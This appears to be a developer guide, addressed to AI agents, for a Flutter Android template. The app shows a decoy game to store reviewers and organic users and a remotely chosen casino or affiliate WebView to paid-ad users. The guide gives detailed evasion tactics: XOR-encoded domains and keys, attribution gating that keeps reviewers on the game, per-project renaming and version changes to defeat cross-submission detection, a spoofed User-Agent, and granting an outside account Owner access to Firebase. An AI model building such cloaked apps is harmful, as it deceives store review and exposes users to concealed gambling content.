# Android Gray Flow — Full Integration Guide
## For AI agents working on gray-part-template-android

---

## What Is the Gray Flow?

A **gray flow** is a dual-mode Flutter app:

- **Gray mode (online):** Shows a full-screen WebView with a URL received from a remote backend. The app acts as a thin shell.
- **White mode (offline):** Shows a native game (fallback for organic/unattributed users).

The backend decides which mode each user sees based on their **AppsFlyer attribution** — install source, campaign, ad network. Paid (non-organic) users get the WebView. Organic users get the game.

**Why this architecture exists:** One APK serves two entirely different experiences, determined at runtime. The game provides a legitimate Store listing with real content. The WebView delivers partner content to targeted users only.

---

## Why Stealth Matters

Store reviewers and automated scanners look for:
- Apps that are "just WebViews" with no real content
- Apps that behave differently during review vs. production
- Known affiliate/tracking domains in the binary
- Structural fingerprints shared across multiple submissions from the same developer

**What happens if caught:** App removal, developer account ban, associated accounts banned.

**Defense strategy:**
1. Real game = real review content (scanner and human reviewer see the game)
2. All sensitive strings XOR-encoded (API domain, AppsFlyer key, Firebase ID)
3. Attribution gate = only paid installs see the WebView (reviewer gets organic install = game)
4. Unique binary fingerprint per project (different codec seed, class names, folder structure, library versions)
5. Real device User-Agent on all requests (no Dart/Flutter fingerprint)

---

## Project Structure

```
lib/
├── main.dart                   Entry point: Firebase, AppCheck, services, runApp
├── app.dart                    Root MaterialApp widget
├── config/
│   ├── app_settings.dart       ★ FILL FIRST: bundleId, storeId, appName
│   ├── analytics_info.dart     ★ AppsFlyer key + Firebase project# + GCD URL (encoded)
│   ├── net_info.dart           ★ Config endpoint URL (encoded)
│   └── game_endpoints.dart     Privacy policy + support URLs
├── models/
│   ├── app_mode.dart           online / offline / pending enum
│   └── remote_response.dart    API JSON model {ok, url, expires, message}
├── screens/
│   ├── splash_screen.dart      ★ CORE: loading video + gray/white routing
│   ├── content_screen.dart     WebView shell (gray mode UI)
│   ├── notification_permission_screen.dart  Push opt-in promo
│   ├── no_internet_screen.dart No connection error + retry
│   └── info_screen.dart        Mini WebView for legal pages (from game)
├── services/
│   ├── appsflyer_service.dart  SDK init + attribution + GCD retry
│   ├── remote_service.dart     POST to config endpoint + URL caching
│   ├── push_notification_service.dart  FCM + local notifications
│   ├── http_client.dart        Real device User-Agent injection
│   ├── storage_service.dart    SharedPreferences + FlutterSecureStorage
│   └── connectivity_service.dart  DNS probe connectivity check
├── utils/
│   └── codec.dart              XOR deobfuscator (change seed per project)
└── game/
    ├── game_screen.dart        ★ White part (do not modify)
    ├── game_engine.dart        Game mechanics (do not modify)
    ├── game_painter.dart       Canvas rendering (do not modify)
    └── game_assets.dart        Asset preloading (do not modify)

tool/
└── encode_keys.dart            Run to encode secrets → byte arrays

android/app/
├── build.gradle.kts            applicationId, minSdk=30, targetSdk=35
├── google-services.json        ★ Firebase config (not in git)
└── src/main/
    ├── AndroidManifest.xml     ★ OneLink host, FCM channel, INTERNET permission
    └── res/drawable/
        └── ic_notification.png ★ Monochrome push notification icon
```

---

## Setup Checklist (new project from this template)

### Step 1 — App identity

Edit `lib/config/app_settings.dart`:
```dart
static const String bundleId = 'com.yourcompany.yourapp';
static const String storeId  = 'com.yourcompany.yourapp';  // same as bundleId on Android
static const String appName  = 'Your App Name';
```

Edit `android/app/build.gradle.kts`:
```kotlin
namespace = "com.yourcompany.yourapp"
defaultConfig {
    applicationId = "com.yourcompany.yourapp"
}
```

Rename the Kotlin package directory:
```
android/app/src/main/kotlin/com/yourcompany/yourapp/
```
Update the `package` declaration in `MainActivity.kt`.

### Step 2 — Encode secrets

Edit `tool/encode_keys.dart` — fill in:
- Config endpoint URL
- AppsFlyer Dev Key
- Firebase project number
- GCD endpoint base URL
- Chrome/WebKit version fragments for User-Agent

Run:
```bash
dart run tool/encode_keys.dart
```

**⚠️ ALWAYS use `dart run`, never PowerShell foreach loops.**
PowerShell overflows integers at 32 bits on Windows → wrong byte values.
Symptom: `FormatException: Invalid HTTP header field value`.

Paste the printed arrays into:
- `lib/config/analytics_info.dart` — AppsFlyer key, Firebase project#, GCD URL
- `lib/config/net_info.dart` — config endpoint
- `lib/services/http_client.dart` — Chrome version fragments

### Step 3 — Change codec seed

Edit `lib/utils/codec.dart` → change `parts` in `_deriveKey()`.
Pick any short ASCII phrase unique to this project (6–12 chars).
**Re-run encode_keys.dart after every seed change.**

### Step 4 — Firebase

Add `android/app/google-services.json` (from Firebase Console → Project Settings → Android app).
Bundle ID in this file must match `applicationId` exactly.

Add `android/app/google-services.json` to `.gitignore` if the repo is public.

### Step 5 — AppsFlyer OneLink

In `android/app/src/main/AndroidManifest.xml`, update the OneLink host:
```xml
<data android:scheme="https" android:host="yourapp.onelink.me" />
```
Get the OneLink subdomain from AppsFlyer dashboard → App Settings → OneLink.

### Step 6 — Notification icon

Place a monochrome PNG at:
```
android/app/src/main/res/drawable/ic_notification.png
```
Requirements:
- Monochrome (white on transparent background)
- NOT the same as the launcher icon
- Size: 24×24dp source, provide mdpi/hdpi/xhdpi/xxhdpi/xxxhdpi versions
  OR provide a single `res/drawable/ic_notification.png` (Android uses it for all densities)

### Step 7 — Firebase service account (push system)

In Firebase Console → Project Settings → Users and permissions → Advanced permission settings (opens GCP):
- Add `marla-export@marfa-290610.iam.gserviceaccount.com`
- Role: Basic → Owner
- Save

Without this, the push notification system cannot send messages.

### Step 8 — Privacy policy URL

Edit `lib/config/game_endpoints.dart`:
```dart
const String privacyPolicyPageUrl = 'https://your-privacy-policy.com';
const String supportPageUrl = 'https://your-support.com';
```

### Step 9 — Code Mixing (mandatory)

See the Code Mixing section below. Every project must have a unique structure.

### Step 10 — Build & verify

```bash
flutter pub get
flutter analyze
flutter build apk --release --obfuscate --split-debug-info=build/debug_info
```

---

## Gray Flow State Machine

```
AppMode.pending (FIRST LAUNCH)
  ├── No internet → NoInternetScreen
  │     └── Retry → SplashScreen (restarts)
  └── Has internet
        ├── appsFlyer.init()
        ├── await [waitForAttribution (30s), waitForDeepLink (5s)]
        │     ⚠️ If af_status=="Organic": wait 5s, retry via GCD API
        ├── buildRequestBody(locale, pushToken)
        ├── remoteApi.fetchRemote(body)
        ├── Response ok+url → setAppMode(online) → ContentScreen
        └── Response fail/no-url → setAppMode(offline) → GameScreen

AppMode.online (RETURNING, WAS WEBVIEW)
  ├── No internet → NoInternetScreen
  ├── Push URL in storage → ContentScreen(pushUrl)  ← HIGHEST PRIORITY
  ├── appsFlyer.init() + attribution (10s timeout)
  ├── fetchRemote() → response.url → ContentScreen(new url)
  └── API fail + savedUrl → ContentScreen(savedUrl)
       └── No savedUrl → NoInternetScreen

AppMode.offline (RETURNING, WAS GAME)
  ├── Load GameAssets
  └── GameScreen (always, no network needed)
```

**Key insight:** Offline users are never shown the WebView on return visits, even if they get internet. The mode is permanently set to offline once the backend says no. This is intentional — the backend decides conversion, not the client.

---

## Backend API Contract

**Endpoint:** POST `AppSettings.apiEndpoint`
**Headers:** `Content-Type: application/json`
**Timeout:** 15 seconds

### Request body

The body is a **merge** of three data sources. Order of priority (first wins):
1. Attribution data from `onInstallConversionData` (all fields, as-is)
2. Deep link data from `onDeepLinking` (putIfAbsent — no overwrite)
3. App-open attribution (putIfAbsent)

Plus these device-side fields (always added, overwrite duplicates):
```json
{
  "af_id": "1688042316289-7152592750959506765",
  "bundle_id": "com.yourcompany.yourapp",
  "os": "Android",
  "store_id": "com.yourcompany.yourapp",
  "locale": "en_US",
  "push_token": "fcm-registration-token",
  "firebase_project_id": "1234567890"
}
```

⚠️ **NEVER filter, modify, or rename the AppsFlyer attribution fields.**
The backend parses the full payload. Missing fields degrade routing accuracy.

Example full body (attribution fields vary by install source):
```json
{
  "adset": "s1s3",
  "af_adset": "mm3",
  "af_status": "Non-organic",
  "campaign": "MyApp_US_Facebook_2025",
  "campaign_id": "6068535534218",
  "media_source": "Facebook Ads",
  "is_first_launch": true,
  "is_paid": true,
  "af_sub1": "439223",
  "af_id": "1688042316289-7152592750959506765",
  "bundle_id": "com.yourcompany.yourapp",
  "os": "Android",
  "store_id": "com.yourcompany.yourapp",
  "locale": "en_US",
  "push_token": "dl28EJC...",
  "firebase_project_id": "8934278530"
}
```

### Response

**Show WebView (gray):**
```json
{ "ok": true, "url": "https://content.example.com/...", "expires": 1689002181 }
```

**Show game (white):**
```json
{ "ok": false, "message": "organic" }
```

`expires` = Unix timestamp. Check on returning visits. If expired, re-fetch.
If re-fetch fails but savedUrl exists, still show the saved URL (don't show nothing).

---

## AppsFlyer: Organic False-Positive Fix

**Problem:** AppsFlyer sometimes fires `onInstallConversionData` with `af_status: "Organic"` even for paid installs (SDK timing bug on first-run).

**Detection:** `payload['af_status'] == 'Organic'`

**Fix in `appsflyer_service.dart`:**
```dart
if (payload['af_status'] == 'Organic') {
  await Future.delayed(Duration(seconds: AppSettings.syncRetrySeconds)); // 5s
  final retryData = await _refreshAttribution();
  _attributionData = retryData ?? payload;
} else {
  _attributionData = payload;
}
```

**GCD API call (in `_refreshAttribution()`):**
```
GET https://gcdsdk.appsflyer.com/install_data/v4.0/{bundleId}?device_id={appsFlyerUID}
Authorization: Bearer {analyticsKey}
```
Returns the true attribution JSON on success.

Use the last successfully received data for the config request.

---

## Push Notifications: Complete Implementation

### Permission flow (per TZ)

1. Show `NotificationPermissionScreen` **before** opening ContentScreen (WebView).
2. Screen shown only once if permission not yet granted and it can still be requested.
3. If user taps "Skip": set `skipUntil = now + 259200` (3 days). Show again after 3 days.
4. If user taps "Accept": call `pushService.requestPermission()` → system dialog appears.
5. If system dialog denied: can't show again (Android OS restriction). No retry.

### shouldShowNotificationScreen() logic (in StorageService):
```dart
bool shouldShowNotificationScreen() {
  if (isNotificationGranted()) return false;        // already granted
  final skipUntil = getNotificationSkipUntil();
  if (skipUntil == null) return true;               // first time
  return DateTime.now().millisecondsSinceEpoch ~/ 1000 >= skipUntil;
}
```

### Push URL routing (per TZ — CRITICAL DISTINCTION):

| Scenario | Method | Action |
|----------|--------|--------|
| App KILLED, user taps push | `getInitialMessage()` at boot | SAVE url to storage via `setPushUrl()` |
| App BACKGROUNDED, user taps push | `onMessageOpenedApp` | Call `onNotificationUrl` callback (NOT saved) |
| App FOREGROUNDED, push arrives | `onMessage` → local notification shown → tap → `onDidReceiveNotificationResponse` | Call `onNotificationUrl` callback (NOT saved) |

The "do not save on warm tap" rule exists because: saved URL persists across sessions, but the spec says push URLs are one-time — on next launch the app should use the config URL, not the push URL.

### Android 13+ permission (API 33+)

Add to `AndroidManifest.xml`:
```xml
<uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
```

This is required for the system permission dialog to appear. Without it, `requestPermission()` is silently ignored on API 33+.

### Notification channel

Create in `_initLocalNotifications()`:
```dart
await androidPlugin?.createNotificationChannel(
  const AndroidNotificationChannel(
    'high_importance_channel',
    'High Importance Notifications',
    importance: Importance.high,
  ),
);
```

Must match AndroidManifest meta-data:
```xml
<meta-data
    android:name="com.google.firebase.messaging.default_notification_channel_id"
    android:value="high_importance_channel" />
```

---

## Screen Layout: NotificationPermissionScreen

### Portrait layout

```
┌─────────────────────────────┐  ← full screen, no AppBar, no system bars
│                             │
│  ┌───────────────────────┐  │
│  │                       │  │  ← video background (full screen, BoxFit.cover)
│  │   nf_screen.mp4       │  │     assets/nf_screen.mp4 (portrait)
│  │   looping, muted      │  │     assets/nf_screen_horizontal.mp4 (landscape)
│  │                       │  │
│  │                       │  │
│  │                       │  │
│  │                       │  │
│  │   ┌───────────────┐   │  │  ← ACCEPT button
│  │   │    Accept     │   │  │     left: size.width * 0.08
│  │   └───────────────┘   │  │     right: size.width * 0.08
│  │                       │  │     bottom: size.height * 0.07
│  │       Skip            │  │  ← SKIP text link
│  └───────────────────────┘  │     below Accept, gap 18dp
│                             │     opacity 0.85 (subdued)
└─────────────────────────────┘
```

Key measurements (current implementation):
- Accept button: `left/right = size.width * 0.08`, `bottom = size.height * 0.07`
- Skip link: 18dp below Accept
- Accept uses gold gradient (#FFCC00 → #FF9900), border-radius 50, glow animation
- Skip uses white text, animated opacity on press

### Landscape layout

```
┌─────────────────────────────────────────────┐
│  ┌─────────────────────────────────────────┐ │
│  │         nf_screen_horizontal.mp4        │ │  ← full-screen video
│  │                                         │ │
│  │         ┌──────────────────┐            │ │  ← ACCEPT button
│  │         │      Accept      │            │ │     width: size.width * 0.32
│  │         └──────────────────┘            │ │     bottom: size.height * 0.06
│  │                 Skip                    │ │  ← SKIP link, 8dp below
│  └─────────────────────────────────────────┘ │
└─────────────────────────────────────────────┘
```

Key measurements (current implementation):
- Both buttons centered horizontally (left: 0, right: 0)
- Accept width: `size.width * 0.32`
- Positioned from bottom: `size.height * 0.06`
- Both buttons use `compact: true` (smaller padding)

### Button animation details
- Accept: AnimationController pulsing glow (0.35→0.75 alpha, 900ms, repeat+reverse)
- Accept: Scale 0.96 on press (AnimatedScale, 80ms)
- Skip: AnimatedOpacity 0.85→0.5 on press (80ms)
- Both: GestureDetector (onTapDown/Up/Cancel) instead of InkWell for better control

---

## Screen Layout: NoInternetScreen

### Portrait layout

```
┌─────────────────────────────┐
│                             │
│    SafeArea padding top     │
│                             │
│          ┌───┐              │
│          │ 📶│              │  ← wifi_off_rounded icon, 52dp, amber
│          └───┘              │     Container 100×100, circle, amber border
│      (pulsing animation)    │     AnimationController 0.85→1.0, 1800ms
│                             │
│   No Internet Connection    │  ← Text, 22sp, bold, white, centered
│                             │     gap 32dp above
│  Check your connection and  │  ← Text, 15sp, white 50% opacity
│       tap Retry             │     gap 12dp below title
│                             │
│  ┌───────────────────────┐  │  ← RETRY button
│  │        Retry          │  │     SizedBox(width: infinity, height: 54)
│  └───────────────────────┘  │     gap 48dp below subtitle
│                             │     gradient: #FFCC00 → #FF9900, radius 16
│                             │     amber glow shadow
│    SafeArea padding bottom  │
└─────────────────────────────┘
```

Key measurements:
- Horizontal padding: 36dp
- Icon container: 100×100, circle shape
- Gap icon → title: 32dp
- Gap title → subtitle: 12dp
- Gap subtitle → button: 48dp
- Button height: 54dp, full width, border-radius 16

### Retry button states:
- **Normal:** Gold gradient + glow shadow
- **Retrying:** Amber 30% opacity fill, no gradient, spinner + "Connecting..." text
- Press animation: AnimationController 1.0→0.94 scale, 120ms (ScaleTransition)
- Guard: `_isRetrying = true` to prevent double-taps

### No landscape override needed:
This screen uses `SafeArea` + `Column(mainAxisAlignment: center)` which
naturally adapts to landscape. No separate landscape layout required.

---

## Android-Specific Bugs & Fixes

### 1. Keyboard covers inputs in WebView

**Symptom:** User taps an email/password field in the WebView. The keyboard appears but the input stays hidden behind it.

**Three-layer fix (ALL three are required):**

**Layer 1 — `AndroidManifest.xml`:**
```xml
android:windowSoftInputMode="adjustResize"
```
NOT `adjustPan` — pan shifts the entire window including status bar.

**Layer 2 — Scaffold:**
```dart
Scaffold(resizeToAvoidBottomInset: false, ...)
```
With `adjustResize` in Manifest, Flutter must NOT also resize. Conflict causes layout fights.

**Layer 3 — JavaScript injection (`_injectKeyboardScrollFix` in ContentScreen):**
- Uses `visualViewport.resize` event (more reliable than `window.onresize`)
- `scrollIntoView({ behavior: 'auto' })` — NOT smooth (see bug #3)
- Single `setTimeout(doScroll, 350)` — NOT 3× at 250/500/800ms

### 2. Status bar shows in portrait WebView

**Symptom:** A colored status bar band is visible at the top of the WebView in portrait mode.

**Fix in `ContentScreen.build()`:**
```dart
Padding(
  padding: EdgeInsets.only(
    top: MediaQuery.of(context).orientation == Orientation.landscape
        ? 0
        : MediaQuery.of(context).viewPadding.top,
  ),
  child: WebViewWidget(controller: _controller),
)
```
Applies status bar height as padding in portrait, removes it in landscape (immersive).

### 3. Keyboard visibly jumps when focusing inputs (jitter)

**Symptom:** Keyboard animates up, then jerks again. Happens randomly. "Reinstall fixes it temporarily."

**Two independent root causes — both must be fixed:**

**Cause A:** `scrollIntoView({ behavior: 'smooth' })` fires during keyboard animation.
Two animators (keyboard + smooth scroll) run concurrently → compositor conflict → jump.
```javascript
// ❌ Wrong
el.scrollIntoView({ behavior: 'smooth', block: 'center' });
// ✅ Correct
el.scrollIntoView({ behavior: 'auto', block: 'nearest' });
```

**Cause B:** `setInterval(apply, 2500)` in `_injectSiteAreaKill` patches `viewport-fit` meta
while keyboard is visible → forces WKWebView layout recalc mid-animation.
```javascript
// ✅ Add guard
function kbOpen() {
  if (!window.visualViewport) return false;
  return window.visualViewport.height < window.innerHeight * 0.75;
}
function apply() {
  if (kbOpen()) return; // skip during keyboard
  // ... rest unchanged
}
```
Note: On Android this is less common than iOS but can occur on some OEM WebViews.

### 4. Too many redirects loop

**Symptom:** Affiliate site does a redirect chain. WebView shows error after 20+ redirects.

**Fix (in `ContentScreen` NavigationDelegate):**
```dart
onWebResourceError: (error) {
  final desc = error.description.toLowerCase();
  if (desc.contains('too_many_redirects') || error.errorCode == -1007) {
    if (_lastRedirectUrl != null && _redirectRetryCount < 3) {
      _redirectRetryCount++;
      _controller.loadRequest(Uri.parse(_lastRedirectUrl!));
      return;
    }
  }
  _checkAndShowNoInternet();
},
```
Track `_lastRedirectUrl` in `onNavigationRequest` for `isMainFrame` requests.

### 5. Safe-area white bars on notched Android

**Symptom:** White or dark horizontal band at top/bottom of WebView content. Varies by device.

**Fix:** `_injectSiteAreaKill()` in `ContentScreen.onPageFinished`:
- Sets all `--safe-area-inset-*` CSS variables to `0px !important`
- Sets `viewport-fit=contain` in viewport meta
- Re-applies on SPA route changes (pushState/replaceState/popstate)
- Safety net: `setInterval(apply, 2500)` for lazy-loaded sites

### 6. Videos don't autoplay in WebView

**Symptom:** Videos on the casino/affiliate site require a tap to start, or show a play button overlay.

**Fix in `_configurePlatform()`:**
```dart
androidController.setMediaPlaybackRequiresUserGesture(false);
```

If still not working, inject JS after `onPageFinished`:
```javascript
document.querySelectorAll('video').forEach(v => {
  v.muted = true; v.defaultMuted = true;
  v.setAttribute('playsinline', '');
  v.play().catch(() => {});
});
```

### 7. Firebase App Check blocks requests in debug mode

**Symptom:** Config endpoint returns 403. Works on real device but not on emulator.

**Fix in `main.dart`:**
```dart
await FirebaseAppCheck.instance.activate(
  androidProvider: kDebugMode
      ? AndroidProvider.debug    // emulator/debug
      : AndroidProvider.playIntegrity,  // release
);
```
Also add the debug token from Firebase Console → App Check → Apps → {your app} → Manage debug tokens.

### 8. Gradle build fails with AccessDeniedException

**Symptom:** `flutter build` or `flutter clean` fails with "Access is denied" on Windows.

**Fix:** Stop the Gradle daemon before cleaning:
```powershell
cd android; .\gradlew.bat --stop; cd ..; flutter clean; flutter pub get
```

### 9. FCM token is null at first launch

**Symptom:** `push_token` is empty in the config request body. Push notifications don't work.

**Cause:** `getToken()` is called before FCM is fully initialized (race condition on first launch).

**Fix:** `pushService.init()` is called early in `_run()`. The token is stored in `_token` field. If still null when `buildRequestBody()` is called, it's passed as null and omitted from body — this is acceptable. The token is sent on next launch or token refresh.

For token refresh: register `pushService.onTokenRefresh = _onPushTokenRefresh` to re-POST when the token rotates.

### 10. `adjustResize` + `resizeToAvoidBottomInset: true` causes layout glitch

If you accidentally set `resizeToAvoidBottomInset: true` in ContentScreen's Scaffold,
Flutter will try to shrink the WebView when the keyboard appears, while Android also
does `adjustResize`. The WebView receives two resize signals and content jumps.
**Fix:** Always `resizeToAvoidBottomInset: false` in ContentScreen.

---

## Obfuscation: What to Hide

### Safe to hide (do it)

| What | Where | How |
|------|-------|-----|
| Config endpoint domain | `net_info.dart` | XOR byte array via `d()` |
| AppsFlyer Dev Key | `analytics_info.dart` | XOR byte array via `d()` |
| Firebase project number | `analytics_info.dart` | XOR byte array via `d()` |
| Chrome/WebKit UA fragments | `http_client.dart` | XOR byte array via `d()` |
| Log statements | All services | Wrap in `if (kDebugMode)` |
| Class names with intent | Rename per project | See Code Mixing section |
| `webview`, `betting`, `casino` in route names | Use neutral names | `/content`, `/reader` |

### Do NOT hide (breaks functionality)

| What | Why |
|------|-----|
| `INTERNET` permission in Manifest | App can't make HTTP requests |
| `POST_NOTIFICATIONS` permission | System push dialog never appears on API 33+ |
| FCM channel meta-data | Push notifications silently dropped |
| `adjustResize` in Manifest | Keyboard covers inputs |
| `google-services.json` | Firebase fails to initialize |
| `FirebaseAppCheck.activate()` | All API requests rejected (403) |

---

## Code Mixing: Mandatory Per-Project Changes

**Never ship two apps with the same folder names, class names, or codec seed.**
Stores scan for cross-submission structural patterns.

### Minimum changes per project

1. **Codec seed** — change `parts` array in `lib/utils/codec.dart`
2. **Library versions** — use different versions from the ranges in pubspec.yaml
3. **Class names** — rename at least `AppsFlyerService`, `RemoteService`, `StorageService`, `ContentScreen`, `SplashScreen`
4. **Folder names** — rename `lib/services/` to e.g. `lib/core/`, `lib/network/`; `lib/config/` to `lib/env/` or `lib/setup/`
5. **File names** — rename `content_screen.dart`, `splash_screen.dart`, etc.

See the full Code Mixing section in `gray_flow_guide.md` for all options and example mappings.

### Build obfuscation

Always build release with:
```bash
flutter build apk --release --obfuscate --split-debug-info=build/debug_info
```

`--obfuscate` renames Dart symbols. Keep `build/debug_info` local — never commit.

---

## Library Versions Reference

```yaml
dependencies:
  appsflyer_sdk: ^6.15.3
  firebase_core: ^3.13.0
  firebase_messaging: ^15.2.4
  firebase_app_check: ^0.3.2+10
  flutter_local_notifications: ^18.0.1
  connectivity_plus: ^6.1.4
  http: ^1.3.0
  device_info_plus: ^11.3.3
  flutter_secure_storage: ^10.0.0
  shared_preferences: ^2.5.3
  webview_flutter: ^4.13.1
  webview_flutter_android: ^4.11.0
  video_player: ^2.9.3
  url_launcher: ^6.3.1
  file_picker: ^11.0.2
  package_info_plus: ^8.3.0
```

**Per-project diversification:** Stagger minor versions between projects.
Check pub.dev for latest compatible versions at project start.

---

## Testing Guide

### Test the tracking link (non-organic install)

To simulate a paid install and see the WebView:
1. Add your device's GAID to AppsFlyer Test Devices list
2. Click this link on the test device BEFORE installing:
```
https://app.appsflyer.com/{bundleId}?pid=Test%20Source&c=testsub_testsub2_testsub_testsub_testsub_testsub_testsub_testsub1%20%23extra&siteid=test&adset=testsub&af_adset=testsub3&af_c_id=testsub4&agency=Test%20Agency&af_sub1=testextra2&af_sub2=testextra3&af_sub3=testextra4&af_sub4=testextra5&af_sub5=testextra6&is_retargeting=true
```
Or use a OneLink with equivalent params.
3. Install the app
4. Expected: WebView opens with the config URL

### Test organic install (game)

Install WITHOUT clicking a tracking link first.
Expected: Game screen, no push permission, no WebView.

### Test offer URL

Use `https://web.team-s.club/` as the WebView content during testing.
This is a test resource that partially validates WebView behavior and app logic.

### Test push notifications

Can only be tested with a Firebase configuration that has push sending capability.
Use the Firebase Console → Cloud Messaging → Test message.
Push token must be in the config request (check debug logs: `[AppsFlyerService] Request body`).

### Check attribution logs

In debug builds, `[AppsFlyerService]` logs:
- `onInstallConversionData:` — raw attribution payload
- `GCD retry data:` — GCD response (only if first response was Organic)
- `Request body:` — final merged body sent to config endpoint

---

## App Requirements (per TZ)

| Requirement | Value |
|------------|-------|
| Target SDK | 35 |
| Min SDK | 30 |
| App size | < 30 MB (100+ MB is unacceptable) |
| Privacy policy | Must be accessible (URL in game + WebView info screen) |
| Loading screen | Must adapt to portrait AND landscape |
| Push promo screen | Must adapt to portrait AND landscape |
| Loading time | < 10 seconds on normal internet speed |
| Adaptive icon | Must fill the icon shape, no empty borders, no clipping |
| Notification icon | Separate monochrome icon (NOT the launcher icon) |
| Push images | Must be supported (BigPictureStyleInformation) |

---

## Common Errors Quick Reference

| Error | Cause | Fix |
|-------|-------|-----|
| `FormatException: Invalid HTTP header field value` | Byte arrays generated with PowerShell | Use `dart run tool/encode_keys.dart` |
| Config returns 403 | Firebase App Check not configured | Set `androidProvider: kDebugMode ? debug : playIntegrity` |
| Push token null | FCM init race condition | Token sent on next launch or refresh — normal on first run |
| WebView blank on organic | No URL returned — correct behavior | Game should show instead |
| Keyboard hides inputs | Missing one of the three keyboard layers | Apply all three: `adjustResize` + `resizeToAvoidBottomInset:false` + JS inject |
| White bar in WebView | Safe-area CSS not overridden | Check `_injectSiteAreaKill()` fires on `onPageFinished` |
| Videos need tap to play | `setMediaPlaybackRequiresUserGesture` not called | Call in `_configurePlatform()` for Android |
| App crashes on `flutter clean` Windows | Gradle daemon holds file locks | Run `gradlew.bat --stop` first |
| Push shows no image | Missing BigPictureStyleInformation | Check `_handleForegroundMessage` image download |
| Attribution always Organic | GCD retry not implemented | Implement `_refreshAttribution()` in AppsFlyerService |
